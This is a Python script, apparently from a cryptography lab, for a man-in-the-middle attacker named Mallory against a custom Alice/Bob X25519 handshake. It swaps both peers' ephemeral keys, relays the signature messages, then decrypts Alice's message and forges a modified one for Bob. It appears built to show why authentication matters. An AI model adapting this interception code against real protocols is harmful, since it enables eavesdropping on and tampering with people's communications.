import sys
import socket
import json
from transport import accept_peer, connect_to_peer, send_message, receive_message
from crypto_utils import (
    generate_x25519_keypair, compute_shared_secret, derive_traffic_keys,
    build_transcript, compute_transcript_hash, encrypt_message, decrypt_message,
    serialize_msg, deserialize_msg
)

ALICE_ID = b"ALICE123"
BOB_ID = b"BOB_4567"
MALLORY_PORT = 5001
BOB_PORT = 5000

def main():
    if len(sys.argv) < 2:
        print("Usage: python mallory.py <Bob-IP>")
        sys.exit(1)
    
    bob_ip = sys.argv[1]
    
    print("--- MALLORY (MITM ATTACKER) ---")
    
    # 1. Listen for Alice
    print(f"[*] Waiting for Alice to connect on port {MALLORY_PORT}...")
    alice_sock, addr = accept_peer(MALLORY_PORT)
    print(f"[+] Alice connected from {addr}")

    # 2. Connect to Bob
    print(f"[*] Connecting to Bob at {bob_ip}:{BOB_PORT}...")
    bob_sock = connect_to_peer(bob_ip, BOB_PORT)
    print(f"[+] Connected to Bob")

    # Generate Mallory's ephemeral keys
    mal_priv_for_alice, mal_pub_for_alice = generate_x25519_keypair()
    mal_priv_for_bob, mal_pub_for_bob = generate_x25519_keypair()

    # --- INTERCEPT M1 (from Alice to Bob) ---
    print("\n[<] Intercepting M1 from Alice...")
    m1_bytes = receive_message(alice_sock)
    m1 = deserialize_msg(m1_bytes)
    
    alice_sid = bytes.fromhex(m1["alice_sid"])
    real_alice_epk = bytes.fromhex(m1["alice_epk"])
    
    print(f"[!] Mallory replacing Alice's ephemeral key with her own...")
    m1["alice_epk"] = mal_pub_for_bob.hex()
    send_message(bob_sock, serialize_msg(m1))
    
    # --- INTERCEPT M2 (from Bob to Alice) ---
    print("\n[<] Intercepting M2 from Bob...")
    m2_bytes = receive_message(bob_sock)
    m2 = deserialize_msg(m2_bytes)
    
    bob_sid = bytes.fromhex(m2["bob_sid"])
    real_bob_epk = bytes.fromhex(m2["bob_epk"])

    print(f"[!] Mallory replacing Bob's ephemeral key with her own...")
    m2["bob_epk"] = mal_pub_for_alice.hex()
    send_message(alice_sock, serialize_msg(m2))

    # --- INTERCEPT M3 (from Alice to Bob) ---
    print("\n[<] Intercepting M3 from Alice (Alice Signature)...")
    m3_bytes = receive_message(alice_sock)
    print("[>] Forwarding M3 to Bob...")
    send_message(bob_sock, m3_bytes)

    # --- INTERCEPT M4 (from Bob to Alice) ---
    # Bob might drop connection here if authentication is on!
    print("\n[<] Waiting for M4 from Bob (Bob Signature)...")
    try:
        m4_bytes = receive_message(bob_sock)
        print("[>] Forwarding M4 to Alice...")
        send_message(alice_sock, m4_bytes)
    except Exception as e:
        print(f"[-] Bob closed connection (likely signature failure): {e}")
        sys.exit(1)

    print("\n=== MITM HANDSHAKE COMPLETE ===")
    
    # Mallory derives keys for Alice
    shared_secret_am = compute_shared_secret(mal_priv_for_alice, real_alice_epk)
    transcript_am = build_transcript(ALICE_ID, BOB_ID, alice_sid, bob_sid, real_alice_epk, mal_pub_for_alice)
    hash_am = compute_transcript_hash(transcript_am)
    k_a2m, k_m2a = derive_traffic_keys(shared_secret_am, hash_am)
    
    # Mallory derives keys for Bob
    shared_secret_mb = compute_shared_secret(mal_priv_for_bob, real_bob_epk)
    transcript_mb = build_transcript(ALICE_ID, BOB_ID, alice_sid, bob_sid, mal_pub_for_bob, real_bob_epk)
    hash_mb = compute_transcript_hash(transcript_mb)
    k_m2b, k_b2m = derive_traffic_keys(shared_secret_mb, hash_mb)

    # --- INTERCEPT APP DATA ---
    print("\n[<] Intercepting encrypted app data from Alice...")
    try:
        app_bytes = receive_message(alice_sock)
        app_msg = deserialize_msg(app_bytes)
        
        # Decrypt Alice -> Mallory
        plaintext = decrypt_message(k_a2m, 0, bytes.fromhex(app_msg["aead_record"]), ALICE_ID, BOB_ID, alice_sid, bob_sid)
        print(f"[!] Mallory successfully decrypted Alice's message: '{plaintext.decode()}'")
        
        # Modify
        modified_plaintext = b"Mallory was here!"
        print(f"[!] Mallory modifying message to: '{modified_plaintext.decode()}'")
        
        # Encrypt Mallory -> Bob
        fake_cipher = encrypt_message(k_m2b, 0, modified_plaintext, ALICE_ID, BOB_ID, alice_sid, bob_sid)
        app_msg["aead_record"] = fake_cipher.hex()
        
        print("[>] Forwarding modified message to Bob...")
        send_message(bob_sock, serialize_msg(app_msg))
    except Exception as e:
        print(f"[-] Error during data phase (or connection closed): {e}")

    alice_sock.close()
    bob_sock.close()

if __name__ == "__main__":
    main()
